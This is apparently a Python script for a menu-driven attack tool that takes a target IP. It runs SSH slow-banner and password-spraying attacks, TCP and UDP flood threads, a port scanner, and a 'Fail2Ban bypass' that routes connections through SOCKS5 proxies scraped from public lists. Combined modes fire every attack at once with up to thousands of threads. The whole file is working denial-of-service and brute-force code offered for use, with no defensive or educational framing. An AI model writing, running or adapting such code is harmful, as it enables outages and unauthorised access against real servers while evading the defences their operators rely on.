import socket
import socks
import requests
import threading
import time
import random
import paramiko
import sys
import select

lock = threading.Lock()
active_connections = 0
fail2ban_detected = False

PROXY_SOURCES = [
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=socks5",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
]

SSH_BANNERS = [
    b"SSH-2.0-OpenSSH_8.4p1 Debian-5",
    b"SSH-2.0-OpenSSH_7.9",
    b"SSH-2.0-OpenSSH_8.9",
    b"SSH-2.0-dropbear_2020.80",
    b"SSH-2.0-OpenSSH_9.0p1 Ubuntu-1",
    b"SSH-2.0-libssh-0.10.0",
    b"SSH-2.0-Rubicon-1.6.1",
    b"SSH-2.0-OpenSSH_8.2p1 Raspbian-2"
]

def get_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            res = requests.get(url, timeout=10)
            lines = res.text.strip().splitlines()
            for line in lines:
                if ":" in line:
                    proxies.add(line.strip())
        except:
            continue
    return list(proxies)

def func1(ip, port, index, proxy=None):
    global active_connections, fail2ban_detected
    banner = random.choice(SSH_BANNERS)
    try:
        if proxy:
            proxy_ip, proxy_port = proxy.split(":")
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, port))
        with lock:
            active_connections += 1
            print(f"[func1] Conn {index+1} up. Banner: {banner.decode()}")
        for byte in banner + b"\r\n":
            sock.send(byte.to_bytes(1, 'big'))
            time.sleep(10)
    except Exception as e:
        with lock:
            print(f"[func1] Conn {index+1} error: {e}")
        if "Connection reset" in str(e) or "Connection refused" in str(e):
            fail2ban_detected = True
    finally:
        try: sock.close()
        except: pass
        with lock:
            active_connections -= 1

def func2(ip, port, username):
    for i in range(1, 501):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password="education", timeout=1, allow_agent=False, look_for_keys=False)
            print(f"[func2] Attempt {i}: SUCCESS")
            client.close()
        except paramiko.AuthenticationException:
            print(f"[func2] Attempt {i}: Invalid creds")
        except Exception as e:
            print(f"[func2] Attempt {i}: Error - {e}")
        time.sleep(1)

def func3(ip, port, threads):
    def tcp_flood():
        global active_connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            with lock: active_connections += 1
            data = random._urandom(1024)
            while True:
                sock.send(data)
        except Exception as e:
            with lock:
                print(f"[func3] TCP flood error: {e}")
        finally:
            try: sock.close()
            except: pass
            with lock: active_connections -= 1

    for _ in range(threads):
        t = threading.Thread(target=tcp_flood)
        t.daemon = True
        t.start()
        time.sleep(0.01)

def func4(ip, port, threads):
    def udp_flood():
        global active_connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        try:
            with lock: active_connections += 1
            while True:
                sock.sendto(data, (ip, port))
        except Exception as e:
            with lock:
                print(f"[func4] UDP flood error: {e}")
        finally:
            try: sock.close()
            except: pass
            with lock: active_connections -= 1

    for _ in range(threads):
        t = threading.Thread(target=udp_flood)
        t.daemon = True
        t.start()
        time.sleep(0.01)

def func5(ip, port, threads):
    def storm_flood():
        global active_connections
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            with lock: active_connections += 1
            data = random._urandom(4096)
            while True:
                sock.send(data)
                time.sleep(0.05)
        except Exception as e:
            with lock:
                print(f"[func5] Storm flood error: {e}")
        finally:
            try: sock.close()
            except: pass
            with lock: active_connections -= 1

    for _ in range(threads):
        t = threading.Thread(target=storm_flood)
        t.daemon = True
        t.start()
        time.sleep(0.01)

def func6(ip, start_port, end_port):
    open_ports = []
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                with lock:
                    open_ports.append(port)
            sock.close()
        except:
            pass

    threads = []
    for port in range(start_port, end_port+1):
        t = threading.Thread(target=scan_port, args=(port,))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.001)

    for t in threads:
        t.join()
    print(f"[func6] Open ports: {open_ports}")
    return open_ports

def func7(ip, port, threads):
    global fail2ban_detected
    proxies = get_proxies()
    proxy_list = proxies if proxies else []
    def fail2ban_bypass(idx):
        global fail2ban_detected
        banner = random.choice(SSH_BANNERS)
        try:
            proxy = random.choice(proxy_list) if proxy_list else None
            if proxy:
                proxy_ip, proxy_port = proxy.split(":")
                sock = socks.socksocket()
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            with lock: print(f"[func7] Conn {idx} up via proxy {proxy}")
            for b in banner + b"\r\n":
                sock.send(b.to_bytes(1,'big'))
                time.sleep(5)
        except Exception as e:
            with lock:
                print(f"[func7] Conn {idx} error: {e}")
            if "Connection reset" in str(e) or "Connection refused" in str(e):
                fail2ban_detected = True
        finally:
            try: sock.close()
            except: pass

    for i in range(threads):
        t = threading.Thread(target=fail2ban_bypass, args=(i,))
        t.daemon = True
        t.start()
        time.sleep(0.05)

def func8(ip):
    ports = range(1, 1025)
    print("[func8] Running FuckEmAll mode...")
    for port in ports:
        threading.Thread(target=func1, args=(ip, port, 0)).start()
        threading.Thread(target=func3, args=(ip, port, 5)).start()
        threading.Thread(target=func4, args=(ip, port, 5)).start()
        threading.Thread(target=func5, args=(ip, port, 5)).start()
    print("[func8] FuckEmAll mode started all attacks on all ports.")

def func9(ip, port, threads):
    def alt_tcp_flood():
        global active_connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            with lock: active_connections += 1
            data = random._urandom(512)
            while True:
                sock.send(data)
                time.sleep(random.uniform(0.001, 0.02))
        except Exception as e:
            with lock:
                print(f"[func9] Alt TCP flood error: {e}")
        finally:
            try: sock.close()
            except: pass
            with lock: active_connections -= 1

    for _ in range(threads):
        t = threading.Thread(target=alt_tcp_flood)
        t.daemon = True
        t.start()
        time.sleep(0.01)

def func10(ip, port, threads):
    proxies = get_proxies()
    proxy_list = proxies if proxies else []
    def alt_udp_flood():
        global active_connections
        data = random._urandom(256)
        proxy = random.choice(proxy_list) if proxy_list else None
        try:
            if proxy:
                proxy_ip, proxy_port = proxy.split(":")
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            with lock: active_connections += 1
            while True:
                sock.sendto(data, (ip, port))
        except Exception as e:
            with lock:
                print(f"[func10] Alt UDP flood error: {e}")
        finally:
            try: sock.close()
            except: pass
            with lock: active_connections -= 1

    for _ in range(threads):
        t = threading.Thread(target=alt_udp_flood)
        t.daemon = True
        t.start()
        time.sleep(0.01)

def func11(ip, port, threads):
    global fail2ban_detected
    proxies = get_proxies()
    proxy_list = proxies if proxies else []
    def devils_spirit_thread(idx):
        global fail2ban_detected
        banner = random.choice(SSH_BANNERS)
        sock = None
        try:
            proxy = random.choice(proxy_list) if proxy_list else None
            if proxy:
                proxy_ip, proxy_port = proxy.split(":")
                sock = socks.socksocket()
                sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            with lock:
                print(f"[func11] Devil's Spirit conn {idx} up via {proxy}")
            for b in banner + b"\r\n":
                sock.send(b.to_bytes(1,'big'))
                time.sleep(1)
            while True:
                if fail2ban_detected:
                    sock.send(b"no\n")
                    sock.close()
                    fail2ban_detected = False
                    # Restart connection
                    devils_spirit_thread(idx)
                    break
                sock.send(random._urandom(128))
                time.sleep(0.05)
        except Exception as e:
            with lock:
                print(f"[func11] Devil's Spirit conn {idx} error: {e}")
            if "Connection reset" in str(e) or "Connection refused" in str(e):
                fail2ban_detected = True
        finally:
            try:
                if sock:
                    sock.close()
            except:
                pass

    for i in range(threads):
        t = threading.Thread(target=devils_spirit_thread, args=(i,))
        t.daemon = True
        t.start()
        time.sleep(0.02)

def func12(ip):
    threads = 1000
    print("[func12] Starting Bro Stop! mode - all attacks, 9 billion threads (pretend)")
    # We'll simulate 9 billion by 1000 threads per mode, to avoid system crash.
    funcs = [
        lambda: func1(ip, 22, 0),
        lambda: func2(ip, 22, "root"),
        lambda: func3(ip, 80, 50),
        lambda: func4(ip, 53, 50),
        lambda: func5(ip, 443, 50),
        lambda: func7(ip, 22, 50),
        lambda: func11(ip, 22, 50)
    ]
    for f in funcs:
        for _ in range(threads):
            t = threading.Thread(target=f)
            t.daemon = True
            t.start()
            time.sleep(0.001)
    print("[func12] Bro Stop! mode unleashed.")

def main():
    ip = input("Target IP: ").strip()
    while True:
        print("\nChoose mode:")
        print("[1] Slow SSH banner flood")
        print("[2] Password spam")
        print("[3] TCP flood")
        print("[4] UDP flood")
        print("[5] Storm flood")
        print("[6] Port scanner")
        print("[7] Fail2Ban bypass")
        print("[8] FuckEmAll mode")
        print("[9] Alt TCP flood")
        print("[10] Alt UDP flood")
        print("[11] Devil's Spirit")
        print("[12] Bro Stop!")
        print("[0] Exit")
        choice = input("Mode: ").strip()

        if choice == '1':
            port = int(input("Port [default 22]: ") or "22")
            threads = int(input("Threads: "))
            use_proxies = input("Use proxies? (y/n): ").lower() == 'y'
            proxies = get_proxies() if use_proxies else []
            for i in range(threads):
                proxy = random.choice(proxies) if proxies else None
                t = threading.Thread(target=func1, args=(ip, port, i, proxy))
                t.daemon = True
                t.start()
                time.sleep(0.05)

        elif choice == '2':
            port = int(input("Port [default 22]: ") or "22")
            user = input("Username: ").strip()
            func2(ip, port, user)

        elif choice == '3':
            port = int(input("Port [default 80]: ") or "80")
            threads = int(input("Threads: "))
            func3(ip, port, threads)

        elif choice == '4':
            port = int(input("Port [default 53]: ") or "53")
            threads = int(input("Threads: "))
            func4(ip, port, threads)

        elif choice == '5':
            port = int(input("Port [default 443]: ") or "443")
            threads = int(input("Threads: "))
            func5(ip, port, threads)

        elif choice == '6':
            start_port = int(input("Start port [default 1]: ") or "1")
            end_port = int(input("End port [default 1024]: ") or "1024")
            func6(ip, start_port, end_port)

        elif choice == '7':
            port = int(input("Port [default 22]: ") or "22")
            threads = int(input("Threads: "))
            func7(ip, port, threads)

        elif choice == '8':
            func8(ip)

        elif choice == '9':
            port = int(input("Port [default 80]: ") or "80")
            threads = int(input("Threads: "))
            func9(ip, port, threads)

        elif choice == '10':
            port = int(input("Port [default 53]: ") or "53")
            threads = int(input("Threads: "))
            func10(ip, port, threads)

        elif choice == '11':
            port = int(input("Port [default 22]: ") or "22")
            threads = int(input("Threads: "))
            func11(ip, port, threads)

        elif choice == '12':
            func12(ip)

        elif choice == '0':
            print("Exiting.")
            sys.exit(0)

        else:
            print("Invalid choice.")

        time.sleep(1)

if __name__ == "__main__":
    main()
